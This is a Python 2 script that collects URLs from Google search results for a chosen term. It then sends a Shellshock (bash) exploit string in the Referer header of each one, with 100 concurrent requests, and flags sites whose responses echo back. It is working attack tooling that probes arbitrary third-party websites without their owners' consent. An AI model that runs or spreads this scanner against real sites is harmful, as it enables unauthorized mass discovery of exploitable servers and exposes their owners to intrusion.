#!/usr/bin/env python2
# -*- coding: utf8 -*-

from gevent import monkey
monkey.patch_all()

import sys
import time
import random
import argparse
import urllib2

from gevent.pool import Pool
from gevent import joinall
from selenium import webdriver
from selenium.webdriver.support.ui import Select, WebDriverWait
from selenium.common.exceptions import NoSuchFrameException
from selenium.webdriver.common.keys import Keys

# If this script no longer fetches any results check the XPath

VULN_FOUND = None

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--search', help='Enter the search term')
    parser.add_argument('-p', '--pages', default='1', help='Enter how many pages to scrape (1 page = 100 results)')
    return parser.parse_args()

def start_browser():
    br = webdriver.Firefox()
    br.implicitly_wait(10)
    return br

def get_ua():
    ua_list = ['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14',
               'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36',
               'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0']
    ua = random.choice(ua_list)
    return ua

def scrape_results(br):
    # Xpath will find a subnode of h3, a[@href] specifies that we only want <a> nodes with
    # any href attribute that are subnodes of <h3> tags that have a class of 'r'
    links = br.find_elements_by_xpath("//h3[@class='r']/a[@href]")
    urls = []
    for link in links:
        url = link.get_attribute('href')
        urls.append(url)
    return urls

def go_to_page(br, page_num, search_term):
    page_num = page_num - 1
    start_results = page_num * 100
    start_results = str(start_results)
    url = 'https://www.google.com/webhp?#num=100&start='+start_results+'&q='+search_term
    print '[*] Fetching 100 results from page '+str(page_num+1)+' at '+url
    br.get(url)
    # Allow time for JS to run
    time.sleep(7)

def action(url):
    ''' Make the payloaded request and check the response's headers for the echo msg'''
    global VULN_FOUND
    exploit = "() { :;}; echo 'Shellshock: Vulnerable'"
    ua = get_ua()

    req = urllib2.Request(url)
    req.add_header('User-Agent', ua)
    req.add_header('Referer', exploit)
    try:
        r = urllib2.urlopen(req, timeout=60)
    except Exception as e:
        return
    resp_headers = r.info()
    if 'shellshock' in r.info():
        VULN_FOUND = True
        print '[!] SHELLSHOCK VULNERABLE:', url
    return

def result_concurrency(urls):
    ''' Open all the greenlet threads '''
    in_parallel = 100
    pool = Pool(in_parallel)
    jobs = [pool.spawn(action, url) for url in urls]
    return joinall(jobs)

def search_google(br, pages, search_term):
    all_urls = []
    for page_num in xrange(int(pages)):
        page_num = page_num+1 # since it starts at 0
        go_to_page(br, page_num, search_term)
        urls = scrape_results(br)
        all_urls += urls # make 1 list, not list of lists
    return list(set(all_urls)) # elimiante dupes

def main():
    args = parse_args()
    if not args.search:
        sys.exit("[!] Enter a term or phrase to search with the -s option: -s 'Dan McInerney'")
    search_term = args.search
    pages = args.pages
    br = start_browser()
    urls = search_google(br, pages, search_term)
    print '[*] Checking each search result...'
    result_concurrency(urls)
    if not VULN_FOUND:
        print '[-] No vulnerable sites found'
    br.close()

main()
